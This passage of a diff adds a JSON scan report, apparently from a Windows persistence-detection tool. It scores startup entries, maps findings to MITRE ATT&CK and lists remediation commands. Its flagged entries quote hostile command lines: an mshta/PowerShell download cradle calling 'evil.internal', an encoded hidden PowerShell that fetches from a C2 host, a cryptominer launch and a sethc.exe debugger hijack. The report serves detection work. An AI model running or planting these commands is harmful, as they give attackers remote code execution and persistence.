+      "file_info": {
+        "file_path": "C:\\Users\\TargetUser\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
+        "exists": true,
+        "file_size": 4210688,
+        "md5": "",
+        "sha1": "",
+        "sha256": "",
+        "entropy": 6.32,
+        "is_high_entropy": false,
+        "compile_time": null,
+        "subsystem": null,
+        "imphash": null,
+        "file_description": null,
+        "company_name": "Microsoft Corporation",
+        "product_name": "Microsoft OneDrive",
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": []
+      },
+      "findings": [],
+      "total_score": 0,
+      "severity": "CLEAN",
+      "remediation_command": "Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"OneDrive\""
+    },
+    {
+      "entry_id": "114ec371",
+      "name": "Winlogon Shell",
+      "category": "Winlogon Persistence",
+      "location": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
+      "raw_command": "explorer.exe",
+      "resolved_path": "C:\\Windows\\explorer.exe",
+      "arguments": "",
+      "enabled": true,
+      "user_context": "HKLM",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\explorer.exe",
+        "exists": true,
+        "file_size": 5132000,
+        "md5": "",
+        "sha1": "",
+        "sha256": "",
+        "entropy": 6.28,
+        "is_high_entropy": false,
+        "compile_time": null,
+        "subsystem": null,
+        "imphash": null,
+        "file_description": null,
+        "company_name": "Microsoft Corporation",
+        "product_name": "Windows Explorer",
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": []
+      },
+      "findings": [],
+      "total_score": 0,
+      "severity": "CLEAN",
+      "remediation_command": null
+    }
+  ],
+  "high_risk_entries": [
+    {
+      "entry_id": "d701c326",
+      "name": "WinAudioHelper",
+      "category": "Registry Run",
+      "location": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "raw_command": "\"C:\\Users\\Public\\svchost.exe\" --background --stratum=pool.minexmr.com:4444",
+      "resolved_path": "C:\\Users\\Public\\svchost.exe",
+      "arguments": "--background --stratum=pool.minexmr.com:4444",
+      "enabled": true,
+      "user_context": "HKCU",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": false,
+        "status": "NotSigned",
+        "signer_name": "",
+        "issuer_name": "",
+        "is_trusted_publisher": false,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Users\\Public\\svchost.exe",
+        "exists": true,
+        "file_size": 1428480,
+        "md5": "e4d909c290d0fb1ca068ffaddf22cbd0",
+        "sha1": "3b71f43ff30f4b15b5cd85d600d810913f3cb863",
+        "sha256": "8f4e2b01c34a9b58210f92b7405df6248d21b926487e42d743a196e481283c9a",
+        "entropy": 7.86,
+        "is_high_entropy": true,
+        "compile_time": "2026-08-12 04:12:00 UTC",
+        "subsystem": "Windows Console",
+        "imphash": "a1b2c3d4e5f60718293a4b5c6d7e8f90",
+        "file_description": null,
+        "company_name": "Microsoft Corporation",
+        "product_name": null,
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": [
+          "Known packer/crypter section identified: '.upx0'",
+          "Section '.upx1' exhibits extremely high entropy (7.92)",
+          "Suspicious API imports detected: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_MASQUERADING_SYSTEM",
+          "rule_name": "Critical System Process Masquerading",
+          "score_impact": 50,
+          "severity": "CRITICAL",
+          "description": "Binary is masquerading as legitimate Windows system file 'svchost.exe' but executes from unauthorized path 'C:\\Users\\Public\\svchost.exe'.",
+          "mitre_attack_id": "T1036.005",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Masquerading: Match Legitimate Name or Location",
+          "remediation_advice": "Cross-reference binary file paths against known Windows system paths; verify Authenticode digital signatures against Microsoft trusted roots."
+        },
+        {
+          "rule_id": "RULE_SUSPICIOUS_PATH",
+          "rule_name": "Suspicious Writable Execution Directory",
+          "score_impact": 35,
+          "severity": "HIGH",
+          "description": "Startup program executes from a high-risk volatile or user-writable directory matching '\\users\\public'.",
+          "mitre_attack_id": "T1547.001",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Registry Run Keys / Startup Folder",
+          "remediation_advice": "Investigate binary provenance, check write permissions, and remove unauthorized startup entry."
+        },
+        {
+          "rule_id": "RULE_UNSIGNED_STARTUP_ENTRY",
+          "rule_name": "Unsigned Startup Executable",
+          "score_impact": 20,
+          "severity": "LOW",
+          "description": "Startup entry 'WinAudioHelper' does not possess an Authenticode digital signature.",
+          "mitre_attack_id": "T1547.001",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Registry Run Keys / Startup Folder",
+          "remediation_advice": "Review publisher and verify executable authenticity."
+        },
+        {
+          "rule_id": "RULE_HIGH_ENTROPY_PACKED",
+          "rule_name": "High Shannon Entropy (7.86) / Packed Binary",
+          "score_impact": 30,
+          "severity": "HIGH",
+          "description": "File exhibits high Shannon entropy of 7.86/8.0, characteristic of packed malware, crypters, or encrypted shellcode.",
+          "mitre_attack_id": "T1027.002",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Software Packing / High Entropy Payload",
+          "remediation_advice": "Employ automated unpackers and memory scanning; monitor for sudden memory allocation with PAGE_EXECUTE_READWRITE."
+        },
+        {
+          "rule_id": "RULE_KNOWN_PACKER_SECTION",
+          "rule_name": "Known Packer / Crypter Section Detected",
+          "score_impact": 30,
+          "severity": "HIGH",
+          "description": "Known packer/crypter section identified: '.upx0'",
+          "mitre_attack_id": "T1027.002",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Software Packing / High Entropy Payload",
+          "remediation_advice": "Employ automated unpackers and memory scanning; monitor for sudden memory allocation with PAGE_EXECUTE_READWRITE."
+        },
+        {
+          "rule_id": "RULE_SUSPICIOUS_API_IMPORTS",
+          "rule_name": "Suspicious Injection / Memory APIs",
+          "score_impact": 20,
+          "severity": "MEDIUM",
+          "description": "Suspicious API imports detected: VirtualAllocEx, WriteProcessMemory, CreateRemoteThread",
+          "mitre_attack_id": "T1055",
+          "mitre_tactic": "Privilege Escalation (TA0004)",
+          "mitre_technique": "Process Injection",
+          "remediation_advice": "Perform dynamic behavioral analysis in sandbox environment."
+        },
+        {
+          "rule_id": "RULE_METADATA_IMPERSONATION",
+          "rule_name": "Corporate Metadata Impersonation",
+          "score_impact": 35,
+          "severity": "HIGH",
+          "description": "File claims CompanyName 'Microsoft Corporation' in metadata but lacks a valid digital signature from that entity.",
+          "mitre_attack_id": "T1036.005",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Masquerading: Match Legitimate Name or Location",
+          "remediation_advice": "Cross-reference binary file paths against known Windows system paths; verify Authenticode digital signatures against Microsoft trusted roots."
+        }
+      ],
+      "total_score": 100,
+      "severity": "CRITICAL",
+      "remediation_command": "Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WinAudioHelper\""
+    },
+    {
+      "entry_id": "1962f578",
+      "name": "WMI Subscription: SystemHealthSync",
+      "category": "WMI Event Consumer",
+      "location": "root\\subscription\\CommandLineEventConsumer (SystemHealthSync)",
+      "raw_command": "mshta.exe javascript:a=new(ActiveXObject)('WScript.Shell');a.Run('powershell -nop -c IEX(New-Object Net.WebClient).DownloadString(\\'http://evil.internal/sync.hta\\')',0);window.close()",
+      "resolved_path": "C:\\Windows\\System32\\mshta.exe",
+      "arguments": "javascript:a=new...",
+      "enabled": true,
+      "user_context": "NT AUTHORITY\\SYSTEM (WMI Provider)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority 2010",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\System32\\mshta.exe",
+        "exists": true,
+        "file_size": 32768,
+        "md5": "36d15dde6d71802d9588cc0d48edf8ea",
+        "sha1": "6faf6bb6b8dabfedc1b40926801144ac95ded2a0",
+        "sha256": "7b70b26081cfa5fae721f6e0a63960034d25cc94d157cd649a4e9907b5af37ea",
+        "entropy": 2.4653,
+        "is_high_entropy": false,
+        "compile_time": "2021-03-25 14:02:01 UTC",
+        "subsystem": "Windows GUI",
+        "imphash": "dcdee2ff2311b9ae7c4d768fa56524dd",
+        "file_description": "Microsoft (R) HTML Application host",
+        "company_name": "Microsoft Corporation",
+        "product_name": "Internet Explorer",
+        "original_filename": "MSHTA.EXE",
+        "sections": [
+          {
+            "name": ".text",
+            "virtual_size": 3488,
+            "raw_size": 4096,
+            "entropy": 5.3956
+          },
+          {
+            "name": ".rdata",
+            "virtual_size": 3468,
+            "raw_size": 4096,
+            "entropy": 3.7969
+          },
+          {
+            "name": ".data",
+            "virtual_size": 1664,
+            "raw_size": 4096,
+            "entropy": 0.0487
+          },
+          {
+            "name": ".pdata",
+            "virtual_size": 228,
+            "raw_size": 4096,
+            "entropy": 0.3231
+          },
+          {
+            "name": ".rsrc",
+            "virtual_size": 4792,
+            "raw_size": 8192,
+            "entropy": 2.8058
+          },
+          {
+            "name": ".reloc",
+            "virtual_size": 48,
+            "raw_size": 4096,
+            "entropy": 0.1161
+          }
+        ],
+        "imports_sample": [],
+        "anomalies": []
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_OBFUSCATED_CMDLINE",
+          "rule_name": "Obfuscated Command: Remote Web Download Cradle",
+          "score_impact": 45,
+          "severity": "CRITICAL",
+          "description": "Command line utilizes stealth or obfuscation techniques: Remote Web Download Cradle in command string.",
+          "mitre_attack_id": "T1059.001",
+          "mitre_tactic": "Execution (TA0002)",
+          "mitre_technique": "Command and Scripting Interpreter: PowerShell",
+          "remediation_advice": "Enable PowerShell Script Block Logging (Event ID 4104), Transcription Logging, and Constrained Language Mode."
+        },
+        {
+          "rule_id": "RULE_LOLBIN_EXECUTION",
+          "rule_name": "Living-Off-The-Land Binary (mshta.exe)",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Startup persistence leverages native system utility 'mshta.exe' to proxy script or command execution.",
+          "mitre_attack_id": "T1218",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "System Binary Proxy Execution",
+          "remediation_advice": "Block or monitor proxy execution of mshta.exe, certutil.exe, regsvr32.exe, rundll32.exe via Windows Defender Application Control (WDAC)."
+        },
+        {
+          "rule_id": "RULE_WMI_PERSISTENCE",
+          "rule_name": "WMI Event Subscription Persistence",
+          "score_impact": 35,
+          "severity": "HIGH",
+          "description": "Persistent WMI Event Consumer triggers command on system events in 'root\\subscription\\CommandLineEventConsumer (SystemHealthSync)'.",
+          "mitre_attack_id": "T1546.003",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Event Triggered Execution: WMI Event Subscription",
+          "remediation_advice": "Inspect root\\subscription namespace for unauthorized CommandLineEventConsumer or ActiveScriptEventConsumer; enable Microsoft-Windows-WMI-Activity/Operational logs."
+        }
+      ],
+      "total_score": 100,
+      "severity": "CRITICAL",
+      "remediation_command": "Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter \"Name='SystemHealthSync'\" | Remove-CimInstance"
+    },
+    {
+      "entry_id": "e744a548",
+      "name": "Startup File: Q3_Financial_Audit_Report.pdf.exe",
+      "category": "Startup Folder (LNK/Binary)",
+      "location": "User Startup Folder (C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe)",
+      "raw_command": "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe",
+      "resolved_path": "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe",
+      "arguments": "",
+      "enabled": true,
+      "user_context": "HKCU",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": false,
+        "status": "NotSigned",
+        "signer_name": "",
+        "issuer_name": "",
+        "is_trusted_publisher": false,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe",
+        "exists": true,
+        "file_size": 834560,
+        "md5": "5d41402abc4b2a76b9719d911017c592",
+        "sha1": "",
+        "sha256": "4cf8291a84f38d6f72576315804537b04f56f1008263da10240f471edd2f8605",
+        "entropy": 7.68,
+        "is_high_entropy": true,
+        "compile_time": null,
+        "subsystem": null,
+        "imphash": null,
+        "file_description": null,
+        "company_name": null,
+        "product_name": null,
+        "original_filename": null,
+        "sections": [],
+        "imports_sample": [],
+        "anomalies": [
+          "Timestomping anomaly: Ancient compile timestamp (1970-01-01 00:00:00 UTC)"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_DOUBLE_EXTENSION",
+          "rule_name": "Deceptive Double File Extension",
+          "score_impact": 45,
+          "severity": "CRITICAL",
+          "description": "Binary uses deceptive double extension 'q3_financial_audit_report.pdf.exe' to disguise executable as document/image.",
+          "mitre_attack_id": "T1036.005",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Masquerading: Match Legitimate Name or Location",
+          "remediation_advice": "Immediately quarantine the executable and check origin phishing vectors."
+        },
+        {
+          "rule_id": "RULE_UNSIGNED_STARTUP_ENTRY",
+          "rule_name": "Unsigned Startup Executable",
+          "score_impact": 20,
+          "severity": "LOW",
+          "description": "Startup entry 'Startup File: Q3_Financial_Audit_Report.pdf.exe' does not possess an Authenticode digital signature.",
+          "mitre_attack_id": "T1547.001",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Registry Run Keys / Startup Folder",
+          "remediation_advice": "Review publisher and verify executable authenticity."
+        },
+        {
+          "rule_id": "RULE_HIGH_ENTROPY_PACKED",
+          "rule_name": "High Shannon Entropy (7.68) / Packed Binary",
+          "score_impact": 30,
+          "severity": "HIGH",
+          "description": "File exhibits high Shannon entropy of 7.68/8.0, characteristic of packed malware, crypters, or encrypted shellcode.",
+          "mitre_attack_id": "T1027.002",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Software Packing / High Entropy Payload",
+          "remediation_advice": "Employ automated unpackers and memory scanning; monitor for sudden memory allocation with PAGE_EXECUTE_READWRITE."
+        },
+        {
+          "rule_id": "RULE_TIMESTOMPING_ANOMALY",
+          "rule_name": "Timestomping Timestamp Anomaly",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Timestomping anomaly: Ancient compile timestamp (1970-01-01 00:00:00 UTC)",
+          "mitre_attack_id": "T1070.006",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Indicator Removal: Timestomp",
+          "remediation_advice": "Compare PE compile header timestamp against NTFS Master File Table ($MFT) $STANDARD_INFORMATION and $FILE_NAME timestamps."
+        }
+      ],
+      "total_score": 100,
+      "severity": "CRITICAL",
+      "remediation_command": "Remove-Item -Path \"C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe\" -Force"
+    },
+    {
+      "entry_id": "c98f122a",
+      "name": "Task: WindowsDefenderTelemetryUpdate",
+      "category": "Scheduled Task",
+      "location": "Tasks\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate",
+      "raw_command": "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AcwB5AHMAdABlAG0ALQB1AHAAZABhAHQAZQBzAC4AdABvAHAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
+      "resolved_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "arguments": "-w hidden -enc SQBFAFgAIAAo...",
+      "enabled": true,
+      "user_context": "NT AUTHORITY\\SYSTEM (At System Startup)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority 2010",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "exists": true,
+        "file_size": 450560,
+        "md5": "9d8e30daf21108092d5980c931876b7e",
+        "sha1": "7c04ec2377e32b3c7742f581f6c5437464dd2cf2",
+        "sha256": "3247bcfd60f6dd25f34cb74b5889ab10ef1b3ec72b4d4b3d95b5b25b534560b8",
+        "entropy": 5.3938,
+        "is_high_entropy": false,
+        "compile_time": "1974-07-29 16:18:42 UTC",
+        "subsystem": "Windows Console",
+        "imphash": "afacf6dc9041114b198160aab4d0ae77",
+        "file_description": "Windows PowerShell",
+        "company_name": "Microsoft Corporation",
+        "product_name": "Microsoft\u00ae Windows\u00ae Operating System",
+        "original_filename": "PowerShell.EXE",
+        "sections": [
+          {
+            "name": ".text",
+            "virtual_size": 40022,
+            "raw_size": 40960,
+            "entropy": 6.118
+          },
+          {
+            "name": ".rdata",
+            "virtual_size": 30748,
+            "raw_size": 32768,
+            "entropy": 4.1135
+          },
+          {
+            "name": ".data",
+            "virtual_size": 3970,
+            "raw_size": 4096,
+            "entropy": 1.7383
+          },
+          {
+            "name": ".pdata",
+            "virtual_size": 2568,
+            "raw_size": 4096,
+            "entropy": 3.4176
+          },
+          {
+            "name": ".rsrc",
+            "virtual_size": 359816,
+            "raw_size": 360448,
+            "entropy": 5.3002
+          },
+          {
+            "name": ".reloc",
+            "virtual_size": 952,
+            "raw_size": 4096,
+            "entropy": 1.966
+          }
+        ],
+        "imports_sample": [],
+        "anomalies": [
+          "Timestomping anomaly: Ancient compile timestamp (1974-07-29 16:18:42 UTC)"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_OBFUSCATED_CMDLINE",
+          "rule_name": "Obfuscated Command: Base64 Encoded PowerShell Command (-enc)",
+          "score_impact": 45,
+          "severity": "CRITICAL",
+          "description": "Command line utilizes stealth or obfuscation techniques: Base64 Encoded PowerShell Command (-enc) in command string.",
+          "mitre_attack_id": "T1059.001",
+          "mitre_tactic": "Execution (TA0002)",
+          "mitre_technique": "Command and Scripting Interpreter: PowerShell",
+          "remediation_advice": "Enable PowerShell Script Block Logging (Event ID 4104), Transcription Logging, and Constrained Language Mode."
+        },
+        {
+          "rule_id": "RULE_LOLBIN_EXECUTION",
+          "rule_name": "Living-Off-The-Land Binary (powershell.exe)",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Startup persistence leverages native system utility 'powershell.exe' to proxy script or command execution.",
+          "mitre_attack_id": "T1218",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "System Binary Proxy Execution",
+          "remediation_advice": "Block or monitor proxy execution of mshta.exe, certutil.exe, regsvr32.exe, rundll32.exe via Windows Defender Application Control (WDAC)."
+        },
+        {
+          "rule_id": "RULE_TIMESTOMPING_ANOMALY",
+          "rule_name": "Timestomping Timestamp Anomaly",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Timestomping anomaly: Ancient compile timestamp (1974-07-29 16:18:42 UTC)",
+          "mitre_attack_id": "T1070.006",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Indicator Removal: Timestomp",
+          "remediation_advice": "Compare PE compile header timestamp against NTFS Master File Table ($MFT) $STANDARD_INFORMATION and $FILE_NAME timestamps."
+        }
+      ],
+      "total_score": 95,
+      "severity": "CRITICAL",
+      "remediation_command": "Unregister-ScheduledTask -TaskName \"\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate\" -Confirm:$false"
+    },
+    {
+      "entry_id": "7d45aafc",
+      "name": "IFEO Hijack: sethc.exe",
+      "category": "Image File Execution Options (IFEO)",
+      "location": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
+      "raw_command": "C:\\Windows\\System32\\cmd.exe",
+      "resolved_path": "C:\\Windows\\System32\\cmd.exe",
+      "arguments": "",
+      "enabled": true,
+      "user_context": "HKLM (System-wide)",
+      "timestamp_discovered": "2026-10-03T19:03:32.501877",
+      "signature": {
+        "is_signed": true,
+        "status": "Valid",
+        "signer_name": "Microsoft Windows",
+        "issuer_name": "Microsoft Root Certificate Authority 2010",
+        "is_trusted_publisher": true,
+        "serial_number": null,
+        "timestamp": null
+      },
+      "file_info": {
+        "file_path": "C:\\Windows\\System32\\cmd.exe",
+        "exists": true,
+        "file_size": 327680,
+        "md5": "7620f0bc3228fe019a6bd8c593c1d856",
+        "sha1": "94bdaeb55589339baed714f681b4690109ebf7fe",
+        "sha256": "a6e3b3b22b7fe8ce2c9245816126723eaa13f43b9f591883e59959a2d409426a",
+        "entropy": 5.9486,
+        "is_high_entropy": false,
+        "compile_time": "2040-02-04 06:33:47 UTC",
+        "subsystem": "Windows Console",
+        "imphash": "139e6eec8cbbc5562c4a148515c0146c",
+        "file_description": "Windows Command Processor",
+        "company_name": "Microsoft Corporation",
+        "product_name": "Microsoft\u00ae Windows\u00ae Operating System",
+        "original_filename": "Cmd.Exe",
+        "sections": [
+          {
+            "name": ".text",
+            "virtual_size": 220525,
+            "raw_size": 221184,
+            "entropy": 6.3367
+          },
+          {
+            "name": ".rdata",
+            "virtual_size": 40352,
+            "raw_size": 40960,
+            "entropy": 4.989
+          },
+          {
+            "name": ".data",
+            "virtual_size": 114248,
+            "raw_size": 4096,
+            "entropy": 0.5424
+          },
+          {
+            "name": ".pdata",
+            "virtual_size": 9840,
+            "raw_size": 12288,
+            "entropy": 4.7503
+          },
+          {
+            "name": ".didat",
+            "virtual_size": 168,
+            "raw_size": 4096,
+            "entropy": 0.2175
+          },
+          {
+            "name": ".rsrc",
+            "virtual_size": 34040,
+            "raw_size": 36864,
+            "entropy": 4.1223
+          },
+          {
+            "name": ".reloc",
+            "virtual_size": 476,
+            "raw_size": 4096,
+            "entropy": 1.0271
+          }
+        ],
+        "imports_sample": [
+          "IsDebuggerPresent"
+        ],
+        "anomalies": [
+          "Timestomping anomaly: Compile timestamp is in the future (2040-02-04 06:33:47 UTC)",
+          "Suspicious API imports detected: IsDebuggerPresent"
+        ]
+      },
+      "findings": [
+        {
+          "rule_id": "RULE_IFEO_DEBUGGER_HIJACK",
+          "rule_name": "Image File Execution Options (IFEO) Hijack",
+          "score_impact": 50,
+          "severity": "CRITICAL",
+          "description": "Debugger registry key intercepts target binary execution via 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger'.",
+          "mitre_attack_id": "T1546.012",
+          "mitre_tactic": "Persistence (TA0003)",
+          "mitre_technique": "Event Triggered Execution: Image File Execution Options",
+          "remediation_advice": "Audit 'HKLM\\...\\Image File Execution Options' for unauthorized 'Debugger' keys; enable Sysmon Event ID 12/13 monitoring."
+        },
+        {
+          "rule_id": "RULE_TIMESTOMPING_ANOMALY",
+          "rule_name": "Timestomping Timestamp Anomaly",
+          "score_impact": 25,
+          "severity": "MEDIUM",
+          "description": "Timestomping anomaly: Compile timestamp is in the future (2040-02-04 06:33:47 UTC)",
+          "mitre_attack_id": "T1070.006",
+          "mitre_tactic": "Defense Evasion (TA0005)",
+          "mitre_technique": "Indicator Removal: Timestomp",
+          "remediation_advice": "Compare PE compile header timestamp against NTFS Master File Table ($MFT) $STANDARD_INFORMATION and $FILE_NAME timestamps."
+        },
+        {
+          "rule_id": "RULE_SUSPICIOUS_API_IMPORTS",
+          "rule_name": "Suspicious Injection / Memory APIs",
+          "score_impact": 20,
+          "severity": "MEDIUM",
+          "description": "Suspicious API imports detected: IsDebuggerPresent",
+          "mitre_attack_id": "T1055",
+          "mitre_tactic": "Privilege Escalation (TA0004)",
+          "mitre_technique": "Process Injection",
+          "remediation_advice": "Perform dynamic behavioral analysis in sandbox environment."
+        }
+      ],
+      "total_score": 95,
+      "severity": "CRITICAL",
+      "remediation_command": "Remove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" -Name \"Debugger\""
+    }
+  ],
+  "remediation_playbook": [
+    {
+      "step": 1,
+      "title": "Neutralize Persistence: WinAudioHelper",
+      "severity": "CRITICAL",
+      "target": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "description": "Execute remediation command to remove unauthorized persistence hook at 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'.",
+      "command": "Remove-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"WinAudioHelper\""
+    },
+    {
+      "step": 2,
+      "title": "Neutralize Persistence: WMI Subscription: SystemHealthSync",
+      "severity": "CRITICAL",
+      "target": "root\\subscription\\CommandLineEventConsumer (SystemHealthSync)",
+      "description": "Execute remediation command to remove unauthorized persistence hook at 'root\\subscription\\CommandLineEventConsumer (SystemHealthSync)'.",
+      "command": "Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Filter \"Name='SystemHealthSync'\" | Remove-CimInstance"
+    },
+    {
+      "step": 3,
+      "title": "Neutralize Persistence: Startup File: Q3_Financial_Audit_Report.pdf.exe",
+      "severity": "CRITICAL",
+      "target": "User Startup Folder (C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe)",
+      "description": "Execute remediation command to remove unauthorized persistence hook at 'User Startup Folder (C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe)'.",
+      "command": "Remove-Item -Path \"C:\\Users\\TargetUser\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Q3_Financial_Audit_Report.pdf.exe\" -Force"
+    },
+    {
+      "step": 4,
+      "title": "Neutralize Persistence: Task: WindowsDefenderTelemetryUpdate",
+      "severity": "CRITICAL",
+      "target": "Tasks\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate",
+      "description": "Execute remediation command to remove unauthorized persistence hook at 'Tasks\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate'.",
+      "command": "Unregister-ScheduledTask -TaskName \"\\Microsoft\\Windows\\Maintenance\\TelemetryUpdate\" -Confirm:$false"
+    },
+    {
+      "step": 5,
+      "title": "Neutralize Persistence: IFEO Hijack: sethc.exe",
+      "severity": "CRITICAL",
+      "target": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger",
+      "description": "Execute remediation command to remove unauthorized persistence hook at 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger'.",
+      "command": "Remove-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" -Name \"Debugger\""
+    }
+  ]
+}
